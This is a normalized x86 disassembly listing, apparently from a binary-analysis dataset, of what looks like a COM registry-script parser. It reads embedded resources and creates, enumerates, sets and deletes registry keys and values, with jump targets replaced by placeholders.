mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x2114 ]
mov edi [ ebp + 0x2110 ]
mov esi edx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x28 ] ecx
lea eax [ ebp + 0x104 ]
mov ecx esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] 0x0
call sub_41b5e0
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x2104 ]
xor ecx ebp
call sub_43f96b
add ebp 0x2108
mov esp ebp
pop ebp
retn 0x8
lea edx [ ebp - 0x14 ]
push edx
lea ebx [ ebp + 0x104 ]
call sub_41ad80
add esp 0x4
test eax eax
jne r-xdata
call sub_41be20
lea eax [ ebp + 0x104 ]
mov ecx esi
call sub_41b5e0
xor esi esi
cmp eax esi
jl r-xdata
mov eax 0x80020009
jmp r-xdata
movzx eax [ ebp - 0x14 ]
cmp eax 0x13
jg r-xdata
cmp eax 0x4008
jne r-xdata
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
call sub_41b5e0
xor edx edx
cmp eax esi
setge dl
dec edx
and eax edx
lea eax [ ebp + 0x104 ]
push eax
call [ lstrlenW@IAT ]
add eax 0x2
mov [ ebp ] esi
mov [ ebp - 0x4 ] esi
lea esi [ ebp ]
mov [ ebp - 0x4 ] 0x1
call sub_41ae40
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push esi
push esi
lea ecx [ ebp + 0x104 ]
push ecx
mov [ ebp - 0x18 ] esi
call [ VarUI4FromStr@IAT ]
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
push 0x4
lea eax [ ebp - 0x14 ]
push eax
push 0x4
push esi
mov [ ebp - 0x14 ] edx
mov edx [ edi ]
push ecx
push edx
call [ RegSetValueExW@IAT ]
lea esi [ ebp - 0x18 ]
mov ebx eax
call sub_41aed0
jmp r-xdata
cmp eax 0x8
je r-xdata
mov eax [ ebp ]
test eax eax
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
lea ecx [ ebp + 0x104 ]
push ecx
call [ lstrlenW@IAT ]
mov ecx [ ebp - 0x1c ]
lea edx [ eax + eax + 0x2 ]
push edx
mov edx [ edi ]
lea eax [ ebp + 0x104 ]
push eax
push 0x1
push esi
push ecx
push edx
call [ RegSetValueExW@IAT ]
mov ebx eax
jmp r-xdata
cmp eax 0x11
jne r-xdata
mov ebx 0xe
cmp [ ebp + 0x104 ] 0x0
mov ebx eax
lea esi [ ebp + 0x104 ]
je r-xdata
mov eax ebx
call sub_41b5a0
jmp r-xdata
lea eax [ ebp + 0x104 ]
push eax
call [ lstrlenW@IAT ]
mov ebx eax
mov [ ebp - 0x14 ] ebx
test bl 0x1
jne r-xdata
lea eax [ ebp ]
call sub_41ae30
xor edx edx
mov [ ebx ] dx
mov edx [ ebp - 0x1c ]
xor eax eax
mov [ ebx + 0x2 ] ax
mov ecx [ ebp ]
push ecx
push edx
push edi
call sub_41ae80
mov ebx eax
mov eax [ ebp ]
jmp r-xdata
mov edi [ CharNextW@IAT ]
mov eax 0x80004005
jmp r-xdata
cdq
sub eax edx
mov edi eax
sar edi 0x1
xor eax eax
mov [ ebp - 0x20 ] edi
mov [ ebp ] eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x4 ] 0x4
cmp eax eax
ja r-xdata
lea ecx [ ebp + 0x4 ]
cmp eax ecx
je r-xdata
mov [ ebx ] cx
add ebx 0x2
add esi 0x2
cmp [ eax ] 0x30
jne r-xdata
push 0x80070057
call sub_427e00
cmp edi 0xffffffff
jbe r-xdata
push esi
call edi
movzx ecx [ esi ]
cmp cx 0x5c
jne r-xdata
mov edi [ ebp - 0x18 ]
xor ecx ecx
mov [ ebx ] cx
push eax
add ebx 0x2
call edi
mov esi eax
jmp r-xdata
cmp edi 0x100
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea edx [ ebp + 0x4 ]
mov [ ebp ] edx
lea ecx [ ebp ]
push ecx
mov eax edi
call sub_41aef0
jmp r-xdata
push edi
push 0x0
push eax
call sub_443360
add esp 0xc
xor esi esi
test ebx ebx
jle r-xdata
lea eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp ]
test eax eax
jne r-xdata
mov ecx [ ebp ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
push edi
push ecx
push 0x3
push 0x0
push edx
push eax
call [ RegSetValueExW@IAT ]
mov ebx eax
lea eax [ ebp + 0x4 ]
cmp [ ebp ] eax
je r-xdata
mov edx [ ebp ]
mov ecx esi
shr ecx 0x1
lea ebx [ ecx + edx ]
mov cx [ ebp + esi * 2 + 0x104 ]
call sub_41af10
mov ecx esi
and ecx 0x1
add ecx ecx
add ecx ecx
mov edx ecx
mov ecx 0x4
sub ecx edx
shl al cl
inc esi
or [ ebx ] al
cmp esi [ ebp - 0x14 ]
jl r-xdata
lea eax [ ebp ]
call sub_41ae30
lea eax [ ebp ]
call sub_41ae30
jmp r-xdata
sub_41b2e0
mov eax 0x2004
call sub_44f7f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2000 ] eax
cmp [ edi ] 0x3d
push esi
mov esi ecx
jne r-xdata
xor eax eax
mov eax edi
call sub_41b5e0
test eax eax
jl r-xdata
mov ecx [ esp + 0x2004 ]
pop esi
xor ecx esp
call sub_43f96b
add esp 0x2004
retn
call sub_41be20
lea eax [ esp + 0x4 ]
mov ecx esi
call sub_41b5e0
test eax eax
jl r-xdata
mov eax edi
mov ecx esi
call sub_41b5e0
test eax eax
jl r-xdata
sub_41b350
push esi
push edi
mov edi [ lstrcmpiW@IAT ]
mov esi r--data
lea ecx [ ecx ]
pop edi
xor eax eax
pop esi
retn
add esi 0x4
cmp esi r--data
jl r-xdata
mov eax [ esi ]
push eax
push ebx
call edi
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_41b390
sub esp 0x228
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x224 ] eax
mov eax [ ecx ]
push ebx
mov ebx [ ecx + 0x4 ]
push ebp
push esi
push edi
mov edi [ esp + 0x23c ]
mov [ esp + 0x24 ] ecx
lea ecx [ esp + 0x20 ]
push ecx
xor ebp ebp
or ebx 0x2001f
push ebx
push ebp
push edi
push eax
mov [ esp + 0x28 ] ebp
mov [ esp + 0x2c ] ebp
mov [ esp + 0x34 ] ebp
call [ RegOpenKeyExW@IAT ]
mov ecx [ esp + 0x14 ]
mov esi eax
cmp esi ebp
jne r-xdata
cmp ecx ebp
je r-xdata
xor eax eax
cmp ecx ebp
je r-xdata
mov eax esi
push ecx
jmp r-xdata
mov ecx [ esp + 0x20 ]
and ebx 0x300
mov esi eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
cmp eax ebp
je r-xdata
push ecx
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov esi [ RegEnumKeyExW@IAT ]
lea edx [ esp + 0x28 ]
push edx
push ebp
push ebp
push ebp
lea eax [ esp + 0x2c ]
push eax
lea edx [ esp + 0x44 ]
push edx
push ebp
push ecx
mov [ esp + 0x3c ] 0x100
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x18 ]
call sub_41b390
mov ebx eax
cmp ebx ebp
jne r-xdata
mov esi [ esp + 0x24 ]
mov [ esp + 0x18 ] ebp
call sub_41b540
mov esi eax
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
push eax
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] ebp
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x18 ]
push ebp
push ebp
push ebp
lea edx [ esp + 0x2c ]
push edx
lea eax [ esp + 0x44 ]
push eax
push ebp
push ecx
mov [ esp + 0x3c ] 0x100
call esi
test eax eax
je r-xdata
push eax
mov eax ebx
jmp r-xdata
push eax
call [ RegCloseKey@IAT ]
mov ecx [ esp + 0x234 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x228
retn 0x4
sub_41b4e0
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ esp + 0x30 ] 0x0
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
xor edx edx
cmp edx [ esp ]
sbb eax eax
neg eax
pop ecx
retn
xor eax eax
pop ecx
retn
sub_41b540
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push eax
call [ RegDeleteKeyW@IAT ]
retn
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push 0x0
push ecx
push edi
push edx
call eax
retn
mov [ rw-data ] 0x1
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
sub_41b5b0
mov eax [ eax ]
mov ecx 0x27
cmp cx [ eax ]
jne r-xdata
xor eax eax
retn
push eax
call [ CharNextW@IAT ]
mov edx 0x27
cmp dx [ eax ]
je r-xdata
mov eax 0x1
retn
sub_41b5e0
push ecx
push esi
push edi
mov esi ecx
mov edi eax
call sub_41be20
mov ecx [ esi ]
movzx eax [ ecx ]
xor edx edx
cmp dx ax
jne r-xdata
push ebx
mov edx 0x27
push ebp
mov ebp [ CharNextW@IAT ]
mov [ esp + 0x10 ] edi
cmp dx ax
jne r-xdata
pop edi
mov eax 0x80020009
pop esi
pop ecx
retn
mov ebx [ esi ]
movzx eax [ ebx ]
add eax 0xfffffff7
cmp eax 0x17
ja r-xdata
push ecx
call ebp
xor ecx ecx
mov [ esi ] eax
cmp cx [ eax ]
je r-xdata
push ebx
call ebp
mov edx [ esp + 0x10 ]
mov [ esi ] eax
sub eax ebx
sar eax 0x1
lea ecx [ edi + eax * 2 + 0x2 ]
add edx 0x2000
cmp ecx edx
jae r-xdata
movzx edx [ eax + lookup_table_41b72c ]
jmp [ edx * 4 + jump_table_41b724 ]
mov ecx [ esi ]
xor edx edx
cmp dx [ ecx ]
je r-xdata
jmp r-xdata
pop ebp
pop ebx
pop edi
mov eax 0x80020009
pop esi
pop ecx
retn
test eax eax
jle r-xdata
pop ebp
xor ecx ecx
pop ebx
mov [ edi ] cx
pop edi
xor eax eax
pop esi
pop ecx
retn
xor eax eax
mov [ edi ] ax
mov ecx [ esi ]
push ecx
call ebp
pop ebp
pop ebx
mov [ esi ] eax
pop edi
xor eax eax
pop esi
pop ecx
retn
mov eax [ esi ]
mov edx 0x27
cmp dx [ eax ]
jne r-xdata
mov edx [ esi ]
xor eax eax
cmp ax [ edx ]
jne r-xdata
mov cx [ ebx ]
mov [ edi ] cx
add edi 0x2
add ebx 0x2
sub eax 0x1
jne r-xdata
mov eax [ esi ]
mov edx 0x27
cmp dx [ eax ]
jne r-xdata
push eax
call ebp
mov ecx 0x27
cmp cx [ eax ]
jne r-xdata
mov ebx [ esi ]
push ebx
call ebp
mov edx [ esp + 0x10 ]
mov [ esi ] eax
sub eax ebx
sar eax 0x1
lea ecx [ edi + eax * 2 + 0x2 ]
add edx 0x2000
cmp ecx edx
jae r-xdata
push eax
call ebp
mov [ esi ] eax
test eax eax
jle r-xdata
mov edx [ esi ]
xor eax eax
cmp ax [ edx ]
jne r-xdata
nop
mov cx [ ebx ]
mov [ edi ] cx
add edi 0x2
add ebx 0x2
sub eax 0x1
jne r-xdata
sub_41b750
push 0xffffffff
push sub_459956
mov eax [ fs : 0x0 ]
push eax
mov eax 0x224c
call sub_44f7f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2248 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2260 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x2270 ]
mov eax [ esp + 0x2274 ]
xor ebx ebx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x30 ] esi
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov edx [ esp + 0x227c ]
mov eax esi
mov [ esp + 0x2268 ] ebx
mov [ esp + 0x40 ] edx
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov ecx [ esp + 0x2260 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2248 ]
xor ecx esp
call sub_43f96b
add esp 0x2258
retn 0x10
cmp [ esi ] 0x7d
je r-xdata
mov eax ebp
mov edi [ esp + 0x30 ]
mov ebp [ lstrcmpiW@IAT ]
push r--data
push edi
mov [ esp + 0x3c ] 0x1
call ebp
mov esi eax
neg esi
push r--data
sbb esi esi
push edi
inc esi
call ebp
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax edi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
cmp esi ebx
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
cmp [ esp + 0x2278 ] ebx
je r-xdata
push r--data
push edi
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
push eax
call [ RegCloseKey@IAT ]
movzx ecx [ edi ]
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov eax edi
cmp cx bx
je r-xdata
mov esi [ esp + 0x20 ]
push r--data
push edi
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov eax edi
mov [ esp + 0x34 ] ebx
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov ebp r--data
mov ebp [ CharNextW@IAT ]
movzx ecx cx
movzx ecx [ edi ]
mov eax edi
cmp cx bx
je r-xdata
lea eax [ esp + 0x25c ]
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
cmp esi ebx
je r-xdata
add ebp 0x4
cmp ebp r--data
jl r-xdata
cmp eax ebx
jne r-xdata
push eax
call ebp
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
cmp [ esp + 0x2278 ] ebx
je r-xdata
mov ebp [ CharNextW@IAT ]
movzx ecx cx
lea esp [ esp ]
mov eax edi
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov [ esp + 0x2c ] ebx
mov esi [ esp + 0x20 ]
mov eax edi
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov eax [ ebp ]
push eax
push edi
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov [ esp + 0x28 ] ecx
push edi
lea ecx [ esp + 0x2c ]
mov [ esp + 0x30 ] ebx
call sub_41b390
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
lea esi [ esp + 0x28 ]
call sub_41b520
cmp cx 0x5c
je r-xdata
jmp r-xdata
cmp [ esp + 0x227c ] ebx
jne r-xdata
mov esi [ esp + 0x24 ]
mov ebp [ RegOpenKeyExW@IAT ]
lea edx [ esp + 0x14 ]
push edx
push 0x2001f
push ebx
push edi
push esi
mov [ esp + 0x28 ] ebx
call ebp
cmp eax ebx
jne r-xdata
cmp eax ebx
jne r-xdata
push eax
call ebp
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
cmp [ edi ] 0x3d
jne r-xdata
lea esi [ esp + 0x28 ]
jmp r-xdata
mov ecx esi
call sub_41b2e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov [ esp + 0x14 ] 0x2
jmp r-xdata
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x20019
push ebx
push edi
push edx
mov [ esp + 0x28 ] ebx
call [ RegOpenKeyExW@IAT ]
cmp eax ebx
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
push 0x20019
push ebx
push edi
push esi
mov [ esp + 0x28 ] ebx
call ebp
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
cmp ecx ebx
je r-xdata
lea esi [ esp + 0x18 ]
call sub_41b520
mov eax 0x80020009
jmp r-xdata
cmp cx 0x5c
je r-xdata
jmp r-xdata
cmp [ esp + 0x2278 ] ebx
je r-xdata
call sub_41b520
mov [ esp + 0x2c ] ebx
mov [ esp + 0x227c ] 0x1
mov [ esp + 0x14 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
cmp ecx ebx
je r-xdata
mov edx esi
push edx
mov edx edi
lea esi [ esp + 0x1c ]
call sub_41ad20
mov ebp eax
cmp ebp ebx
jne r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
cmp ecx ebx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ebx
cmp eax ebx
je r-xdata
push ecx
call [ RegCloseKey@IAT ]
cmp [ esp + 0x227c ] ebx
jne r-xdata
mov edx [ esp + 0x24 ]
lea eax [ esp + 0x25c ]
mov [ esp + 0x2268 ] 0x1
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x50 ] edx
push ecx
mov ecx edi
mov edx esi
mov [ esp + 0x58 ] ebx
call sub_41af80
mov ebp eax
cmp ebp ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
jl r-xdata
mov edx [ esp + 0x30 ]
cmp [ edx ] 0x7d
jne r-xdata
mov edx [ esp + 0x30 ]
push edx
call [ lstrlenW@IAT ]
cmp eax 0x1
jne r-xdata
mov ecx esi
call sub_41b2e0
mov ebp eax
cmp ebp ebx
jl r-xdata
push 0xffffffff
push edi
lea edx [ esp + 0x5c ]
push 0x104
push edx
call sub_441b1b
push eax
call sub_4237a0
add esp 0x14
mov eax edi
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ebx
push ecx
call [ RegCloseKey@IAT ]
lea esi [ esp + 0x18 ]
call sub_41b520
mov eax ebp
call sub_41b5a0
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov eax edi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov ecx [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ebx
cmp eax ebx
je r-xdata
push ecx
call [ RegCloseKey@IAT ]
mov ecx esi
call sub_41b2e0
mov ebp eax
cmp ebp ebx
jl r-xdata
cmp [ esp + 0x34 ] ebx
je r-xdata
lea esi [ esp + 0x4c ]
call sub_41b520
lea esi [ esp + 0x18 ]
call sub_41b520
jmp r-xdata
mov [ esp + 0x2268 ] bl
mov [ esp + 0x50 ] ebx
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x2278 ]
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x20 ]
push ebx
push eax
push ecx
push edi
mov ecx esi
call sub_41b750
mov ebp eax
cmp ebp ebx
jl r-xdata
cmp [ edi ] 0x7b
jne r-xdata
cmp [ edi ] 0x3d
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x14 ]
push edx
push 0x20006
push ebx
push ebx
push eax
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x28 ] ebx
call [ RegOpenKeyExW@IAT ]
cmp eax ebx
jne r-xdata
cmp [ edi ] 0x7b
jne r-xdata
mov eax edi
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x40 ]
mov [ esp + 0x227c ] edx
cmp eax 0x2
je r-xdata
push edi
call [ lstrlenW@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x20 ]
push ebx
lea eax [ esp + 0x1c ]
push eax
mov ecx edi
call sub_41af80
mov ebp eax
cmp ebp ebx
jl r-xdata
call sub_41b5a0
lea esi [ esp + 0x38 ]
jmp r-xdata
mov ebp [ esp + 0x14 ]
lea ecx [ esp + 0x25c ]
push ecx
push ebp
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] ebx
call [ RegDeleteValueW@IAT ]
cmp eax ebx
je r-xdata
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ esp + 0x227c ]
mov ecx [ esp + 0x18 ]
push eax
push ebx
push ecx
push edi
mov ecx esi
call sub_41b750
mov ebp eax
cmp ebp ebx
jge r-xdata
jmp r-xdata
mov ebp eax
cmp ebp ebx
je r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ esp + 0x18 ]
cmp edx ebx
je r-xdata
cmp edx ebx
jne r-xdata
mov eax edi
mov ecx esi
call sub_41b5e0
mov ebp eax
cmp ebp ebx
jl r-xdata
cmp [ esp + 0x227c ] ebx
je r-xdata
mov [ esp + 0x3c ] ebx
push ebp
call [ RegCloseKey@IAT ]
mov [ esp + 0x38 ] ebx
mov ecx esi
call sub_41b4e0
xor edi edi
mov [ esp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov ecx esi
call sub_41b4e0
test eax eax
je r-xdata
call sub_41b5a0
mov ebp eax
jmp r-xdata
mov [ esp + 0x1c ] ebx
cmp edi ebx
jne r-xdata
push esi
call [ RegCloseKey@IAT ]
mov edi eax
mov [ esp + 0x18 ] ebx
lea ebx [ esp + 0x54 ]
call sub_41b350
test eax eax
je r-xdata
lea esi [ esp + 0x18 ]
call sub_41b520
mov eax edi
call sub_41b5a0
jmp r-xdata
cmp [ esp + 0x34 ] ebx
je r-xdata
xor ebx ebx
cmp [ esp + 0x34 ] 0x0
je r-xdata
cmp [ esp + 0x14 ] ebx
jne r-xdata
mov eax ebx
push eax
lea ecx [ esp + 0x1c ]
call sub_41b390
mov ecx [ esp + 0x24 ]
lea edi [ esp + 0x54 ]
lea esi [ esp + 0x44 ]
mov [ esp + 0x44 ] ecx
mov [ esp + 0x48 ] ebx
call sub_41b540
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
cmp eax ebx
jne r-xdata
call sub_41b5a0
lea esi [ esp + 0x44 ]
call sub_41b520
jmp r-xdata
sub_41be20
push edi
mov edi [ CharNextW@IAT ]
pop edi
retn
movzx ecx [ ecx + lookup_table_41be54 ]
jmp [ ecx * 4 + jump_table_41be4c ]
push eax
call edi
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
movzx ecx [ eax ]
add ecx 0xfffffff7
cmp ecx 0x17
ja r-xdata
sub_41be70
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x2014
call sub_44f7f0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2010 ] eax
push ebx
push esi
mov esi edx
push edi
push esi
lea edx [ esp + 0x14 ]
mov [ esp + 0x14 ] 0x0
call sub_41a9a0
mov edi eax
test edi edi
jl r-xdata
mov ecx [ esp + 0x201c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x4
mov eax [ esp + 0x10 ]
xor ecx ecx
mov [ esi ] eax
cmp cx [ eax ]
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ CoTaskMemFree@IAT ]
mov eax edi
lea eax [ esp + 0x18 ]
mov ecx esi
call sub_41b5e0
mov edi eax
test edi edi
jl r-xdata
xor edi edi
jmp r-xdata
mov edx [ edi * 8 + r--data ]
push edx
lea eax [ esp + 0x1c ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ebx [ edi * 8 + r--data ]
test ebx ebx
je r-xdata
inc edi
cmp edi 0xe
jb r-xdata
mov edi 0x80020009
jmp r-xdata
lea eax [ esp + 0x18 ]
mov ecx esi
call sub_41b5e0
mov edi eax
test edi edi
jl r-xdata
mov ecx 0x7b
cmp cx [ esp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
test eax eax
je r-xdata
push 0x0
push ebx
lea ecx [ esp + 0x24 ]
push ecx
mov ecx esi
call sub_41b750
mov edi eax
test edi edi
jl r-xdata
mov edx [ esi ]
push eax
push ebx
lea eax [ esp + 0x24 ]
push eax
mov ecx esi
mov [ esp + 0x24 ] edx
call sub_41b750
mov edi eax
test edi edi
jge r-xdata
call sub_41be20
mov edx [ esi ]
xor eax eax
cmp ax [ edx ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push 0x0
push 0x0
push ebx
lea edx [ esp + 0x24 ]
mov [ esi ] ecx
push edx
mov ecx esi
call sub_41b750
jmp r-xdata
sub_41bfc0
push ebp
lea ebp [ esp - 0x408 ]
sub esp 0x408
push 0xffffffff
push sub_459ea0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x404 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x410 ]
mov esi [ ebp + 0x414 ]
xor ebx ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] ebx
mov [ ebp ] ebx
push 0x2
push ebx
push eax
mov [ ebp - 0x4 ] 0x1
call [ LoadLibraryExW@IAT ]
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
push esi
push edi
call [ FindResourceW@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
call sub_41a770
mov esi eax
jmp r-xdata
push esi
push edi
call [ LoadResource@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_41a770
jmp r-xdata
lea ecx [ ebp + 0x4 ]
cmp [ ebp ] ecx
je r-xdata
push esi
push edi
call [ SizeofResource@IAT ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x14 ] eax
cmp ecx eax
jae r-xdata
call sub_41a770
jmp r-xdata
mov esi eax
mov eax esi
lea eax [ ebp ]
call sub_41ae30
mov eax ecx
lea esi [ ebp ]
mov [ ebp - 0x4 ] 0x2
call sub_41a730
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
lea ecx [ ebp + 0x4 ]
cmp [ ebp ] ecx
je r-xdata
mov ecx [ ebp ]
cmp ecx ebx
jne r-xdata
lea esi [ ebp - 0x1c ]
call sub_41aed0
mov eax 0x8007000e
jmp r-xdata
lea eax [ ebp ]
call sub_41ae30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x20 ]
push eax
push ecx
push eax
push edx
push ebx
push 0x3
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
jne r-xdata
mov esi 0x8007000e
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x404 ]
xor ecx ebp
call sub_43f96b
add ebp 0x408
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x418 ]
mov ecx [ ebp ]
push eax
lea edx [ ebp - 0x28 ]
call sub_41be70
call sub_41a770
jmp r-xdata
push edi
call [ FreeLibrary@IAT ]
sub_41c160
push 0xffffffff
push sub_459ed8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x18 ]
xor ecx ecx
mov [ esp + 0x18 ] ecx
mov [ esp + 0xc ] ecx
cmp eax ecx
je r-xdata
mov eax 0x80070057
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
push ecx
push eax
mov eax [ esp + 0x1c ]
push eax
mov ecx r--data
call sub_41bfc0
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0xc
retn 0x8
sub_41c1d0
sub esp 0xa68
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa64 ] eax
mov eax [ esp + 0xa70 ]
push ebx
push ebp
mov ebp [ esp + 0xa74 ]
push esi
xor ebx ebx
mov [ esp + 0x10 ] eax
xor eax eax
mov esi ecx
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] bl
call sub_41a300
mov edi eax
cmp edi ebx
jl r-xdata
lea ecx [ esp + 0x18 ]
call sub_41a290
mov eax edi
mov [ esp + 0x40 ] 0x1
cmp esi ebx
je r-xdata
mov eax [ ebp ]
mov edx [ eax + 0x14 ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx ebp
call edx
mov esi eax
cmp esi ebx
jge r-xdata
mov eax [ esi ]
cmp eax ebx
je r-xdata
mov esi [ rw-data ]
push 0x104
lea eax [ esp + 0x48 ]
push eax
push esi
mov [ esp + 0x1c ] ebx
call [ GetModuleFileNameW@IAT ]
cmp eax ebx
jne r-xdata
